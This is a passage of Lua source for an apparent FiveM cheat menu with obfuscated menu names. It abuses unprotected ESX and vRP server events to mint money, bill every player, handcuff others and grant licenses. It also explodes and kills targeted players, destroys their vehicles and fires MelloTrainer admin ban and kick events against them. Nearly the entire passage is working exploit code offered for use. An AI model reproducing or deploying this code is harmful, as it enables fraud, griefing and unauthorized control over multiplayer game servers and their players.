						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~r~~h~Model is not valid!")
					end
				elseif WarMenu.Button("~h~Flip Vehicle") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
						SetVehicleOnGroundProperly(playerVeh)
						drawNotification("~g~Vehicle Flipped!")
					else
						drawNotification("~r~You Aren't In The Driverseat Of A Vehicle!")
					end
				elseif WarMenu.Button("~h~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				
				elseif WarMenu.Button("~h~Change License Plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
					end

				elseif WarMenu.Button("~h~Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					WarMenu.CheckBox(
					"~h~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif WarMenu.Button("~h~~r~Delete Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif WarMenu.Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif WarMenu.Button("~h~Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now clean")
				elseif
					WarMenu.CheckBox(
						"~h~No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end)
				 then
				elseif
					WarMenu.CheckBox(
						"~h~Vehicle Godmode",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				elseif
					WarMenu.CheckBox(
					"~h~Speedboost ~g~SHIFT ~r~CTRL",
						VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
				then
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\83\101\114\118\101\114\77\101\110\117\10") then
				
				if WarMenu.MenuButton("~g~~h~ESX ~s~BOSS Menus", "\69\83\88\66\111\115\115\10") then
				elseif WarMenu.MenuButton("~g~~h~ESX ~s~Money Options", "\69\83\88\77\111\110\101\121\10") then
				elseif WarMenu.MenuButton("~g~~h~ESX ~s~Misc Options", "\69\83\88\77\105\115\99\10") then
				elseif WarMenu.MenuButton("~g~~h~ESX ~s~Drugs", "\69\83\88\68\114\117\103\115\10	") then
				elseif WarMenu.MenuButton("~b~~h~VRP ~s~Server Options", "\86\82\80\79\112\116\105\111\110\115\10") then
				elseif WarMenu.MenuButton("~o~~h~Misc ~s~Options", "\77\105\115\99\83\101\114\118\101\114\79\112\116\105\111\110\115\10") then
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\69\83\88\66\111\115\115\10") then
				
				if WarMenu.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","mecano",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","police",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","gang",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","banker",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\69\83\88\77\111\110\101\121\10") then
				
			if WarMenu.Button("~g~~h~ESX ~y~Caution Give Back") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				end
			elseif WarMenu.Button("~g~~h~ESX ~y~TruckerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif WarMenu.Button("~g~~h~ESX ~y~Admin Give Bank") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif WarMenu.Button("~g~~h~ESX ~y~Admin Give Cash") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif WarMenu.Button("~g~~h~ESX ~y~GOPostalJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif WarMenu.Button("~g~~h~ESX ~y~BankerJob Pay") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif WarMenu.Button("~g~~h~ESX ~y~Slot Machine") then
				local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			end


			WarMenu.Display()
				elseif WarMenu.IsMenuOpened("\69\83\88\77\105\115\99\10") then
					
				if WarMenu.Button("~w~~h~Set hunger to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif WarMenu.Button("~w~~h~Set thirst to ~h~~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif WarMenu.Button("~g~~h~ESX ~y~Revive ~h~ID") then
					local id = KeyboardInput("Enter Player ID", "", 1000)
					if id then
					TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i))
					end
				elseif WarMenu.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 64 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif WarMenu.Button("~g~~h~ESX ~b~Handcuff ~h~ID") then
					local id = KeyboardInput("Enter Player ID", "", 1000)
					if id then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				elseif WarMenu.Button("~g~~h~ESX ~w~Get all licenses") then
					TriggerServerEvent('esx_dmvschool:addLicense', dmv)
					TriggerServerEvent('esx_dmvschool:addLicense', drive)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\77\105\115\99\83\101\114\118\101\114\79\112\116\105\111\110\115\10") then
				
				if WarMenu.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif WarMenu.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\86\82\80\79\112\116\105\111\110\115\10") then
				
				if WarMenu.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif WarMenu.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif WarMenu.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif WarMenu.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif WarMenu.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end


				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\69\83\88\68\114\117\103\115\10	") then
				
				if WarMenu.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif WarMenu.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif WarMenu.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif WarMenu.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif WarMenu.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif WarMenu.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif WarMenu.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif WarMenu.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif WarMenu.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif WarMenu.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif WarMenu.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif WarMenu.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif WarMenu.Button("~h~~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif WarMenu.Button("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					drawNotification("~r~Everything is now stopped.")
				elseif WarMenu.CheckBox("~r~Blow Drugs Up",
					BlowDrugsUp,
					function(enabled)
						BlowDrugsUp = enabled
					end)
				then
				end

	
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	") then
					for i = 0, 64 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and WarMenu.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10') then
						SelectedPlayer = i
					end
				end
		

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10") then
				
				WarMenu.SetSubTitle("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if WarMenu.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				elseif WarMenu.Button("Teleport To") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)	
				elseif WarMenu.Button("~g~ESX ~s~Give money to player from your wallet") then
					local result = KeyboardInput("Enter amount of money to give", "", 100000000)
					if result then
					TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
					end
				elseif WarMenu.Button("~g~ESX ~s~Send Bill") then
					local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), "Purposeless", name, amount)
					end
				elseif WarMenu.Button("~g~ESX ~b~Policejob Handcuff Player") then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
				elseif WarMenu.Button("~g~ESX ~s~Revive player") then
					TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))	
				elseif WarMenu.Button("~r~Slap/Kill") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)	
				elseif WarMenu.Button("~y~Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
				elseif WarMenu.Button("Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif WarMenu.Button("Remove All Weapons") then
					for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
						end
				elseif WarMenu.MenuButton("Give Single Weapon", "\83\105\110\103\108\101\87\101\112\80\108\97\121\101\114\10	") then
				elseif WarMenu.Button("Give Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					else
						drawNotification("~r~Model is not valid!")
					end

				elseif WarMenu.Button("Kick From Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))

				elseif WarMenu.Button("Destroy His Engine") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)

				elseif WarMenu.Button("~h~Repair His Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)

				elseif WarMenu.Button("Fuck Up His Car") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						StartVehicleAlarm(playerVeh)
						DetachVehicleWindscreen(playerVeh)
						SmashVehicleWindow(playerVeh, 0)
						SmashVehicleWindow(playerVeh, 1)
						SmashVehicleWindow(playerVeh, 2)
						SmashVehicleWindow(playerVeh, 3)
						SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
						SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
						SetVehicleDoorBroken(playerVeh, 0, true)
						SetVehicleDoorBroken(playerVeh, 1, true)
						SetVehicleDoorBroken(playerVeh, 2, true)
						SetVehicleDoorBroken(playerVeh, 3, true)
						SetVehicleDoorBroken(playerVeh, 4, true)
						SetVehicleDoorBroken(playerVeh, 5, true)
						SetVehicleDoorBroken(playerVeh, 6, true)
						SetVehicleDoorBroken(playerVeh, 7, true)
						SetVehicleLights(playerVeh, 1)
						Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
						SetVehicleNumberPlateTextIndex(playerVeh, 5)
						SetVehicleNumberPlateText(playerVeh, "HamHaxia")
						SetVehicleDirtLevel(playerVeh, 10.0)
						SetVehicleModColor_1(playerVeh, 1)
						SetVehicleModColor_2(playerVeh, 1)
						SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
						SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
						SetVehicleBurnout(playerVeh, true)
						drawNotification("~g~Vehicle Fucked Up!")

				elseif WarMenu.Button("~r~MelloTrainer ~s~BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif WarMenu.Button("~r~MelloTrainer ~s~KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server." )
				end
				

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\83\105\110\103\108\101\87\101\112\80\108\97\121\101\114\10") then
				for i = 1, #allWeapons do
					if WarMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
					end
				end

				WarMenu.Display()
			elseif IsDisabledControlPressed(0, 121) then
				WarMenu.OpenMenu("\76\121\110\120\77\97\105\110\77\101\110\117\10")
			end

			Citizen.Wait(0)
		end
	end
)

RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)
